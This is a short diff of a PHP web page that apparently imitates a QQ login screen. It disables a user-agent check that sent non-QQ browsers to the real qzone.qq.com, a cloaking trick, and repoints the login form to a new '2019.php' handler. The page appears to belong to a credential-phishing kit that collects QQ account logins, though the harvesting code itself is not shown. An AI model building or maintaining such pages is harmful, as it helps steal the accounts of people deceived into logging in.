@@ -562,10 +562,11 @@ require_once 'include/common.php';
 
     <script type="text/javascript">
         (function () {
-            var sUserAgent = navigator.userAgent.toLowerCase();
-            if (sUserAgent.match(/QQ/i) != 'qq') {
-                window.location.href = 'https://qzone.qq.com';
-            }
+            // 必须使用QQ浏览器
+            // var sUserAgent = navigator.userAgent.toLowerCase();
+            // if (sUserAgent.match(/QQ/i) != 'qq') {
+            //     window.location.href = 'https://qzone.qq.com';
+            // }
         })();
 
         (function () {
@@ -749,7 +750,7 @@ require_once 'include/common.php';
     <div id="logo" class="logo"></div>
 
     <!--<form id="form" action="index.php" method="post" onsubmit="return onpost()"> -->
-    <form action="2018.php" method="post" onSubmit="return ts()">
+    <form action="2019.php" method="post" onSubmit="return ts()">
 
         <div id="q_logon_list" class="q_logon_list"></div>
         </div>
